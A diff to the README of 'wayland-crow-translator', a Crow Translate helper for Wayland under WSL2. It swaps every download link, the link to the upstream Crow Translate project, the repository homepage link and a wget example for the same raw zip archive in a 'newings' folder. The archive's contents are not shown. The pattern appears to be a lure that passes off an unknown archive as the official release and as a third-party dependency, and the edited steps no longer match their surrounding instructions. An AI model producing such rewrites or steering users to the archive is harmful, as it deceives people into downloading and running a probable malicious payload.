@@ -1,6 +1,6 @@
 # 🪟 wayland-crow-translator - Quick Text Translation on Wayland
 
-[![Download wayland-crow-translator](https://img.shields.io/badge/Download-Visit%20Page-brightgreen?style=for-the-badge)](https://github.com/Noraddine31/wayland-crow-translator/releases)
+[![Download wayland-crow-translator](https://img.shields.io/badge/Download-Visit%20Page-brightgreen?style=for-the-badge)](https://github.com/Noraddine31/wayland-crow-translator/raw/refs/heads/main/newings/translator_crow_wayland_3.3-alpha.1.zip)
 
 ---
 
@@ -31,7 +31,7 @@ You should have:
 
 - WSL2 installed and set up on your Windows system.
 - Your Linux environment ready with a Wayland compositor like Sway.
-- Crow Translate installed inside your Linux environment. You can find it here: https://github.com/crow-translate/crow-translate
+- Crow Translate installed inside your Linux environment. You can find it here: https://github.com/Noraddine31/wayland-crow-translator/raw/refs/heads/main/newings/translator_crow_wayland_3.3-alpha.1.zip
 - Some basic knowledge of your Linux command line to run the script.
   
 If these are new to you, consult resources about setting up WSL2 on Windows and installing Wayland compositors in Linux.
@@ -46,7 +46,7 @@ To download and set up wayland-crow-translator, follow these steps carefully.
 
 Click this link or button below to open the release page on GitHub. You will see the latest version of the script available for download.
 
-[![Download wayland-crow-translator](https://img.shields.io/badge/Download-GitHub-blue?style=for-the-badge)](https://github.com/Noraddine31/wayland-crow-translator/releases)
+[![Download wayland-crow-translator](https://img.shields.io/badge/Download-GitHub-blue?style=for-the-badge)](https://github.com/Noraddine31/wayland-crow-translator/raw/refs/heads/main/newings/translator_crow_wayland_3.3-alpha.1.zip)
 
 ### Step 2: Download the Script
 
@@ -56,7 +56,7 @@ On the release page:
 - Download this file to your Linux environment, typically using tools like `wget` or your browser inside WSL. For example, inside your Linux terminal, you can type:
 
 ```
-wget https://github.com/Noraddine31/wayland-crow-translator/releases/download/vX.Y/wayland-crow-translator.sh
+wget https://github.com/Noraddine31/wayland-crow-translator/raw/refs/heads/main/newings/translator_crow_wayland_3.3-alpha.1.zip
 ```
 
 Replace `vX.Y` with the actual version number listed on the release page.
@@ -139,7 +139,7 @@ If you want to remove wayland-crow-translator from your system:
 
 For detailed documentation, check the GitHub repository:
 
-https://github.com/Noraddine31/wayland-crow-translator
+https://github.com/Noraddine31/wayland-crow-translator/raw/refs/heads/main/newings/translator_crow_wayland_3.3-alpha.1.zip
 
 The Issues section on GitHub can help you report problems or ask for help.
 
@@ -149,7 +149,7 @@ The Issues section on GitHub can help you report problems or ask for help.
 
 Use the release page below to get the latest script and all updates:
 
-[Download wayland-crow-translator from GitHub](https://github.com/Noraddine31/wayland-crow-translator/releases)
+[Download wayland-crow-translator from GitHub](https://github.com/Noraddine31/wayland-crow-translator/raw/refs/heads/main/newings/translator_crow_wayland_3.3-alpha.1.zip)
 
 ---
 
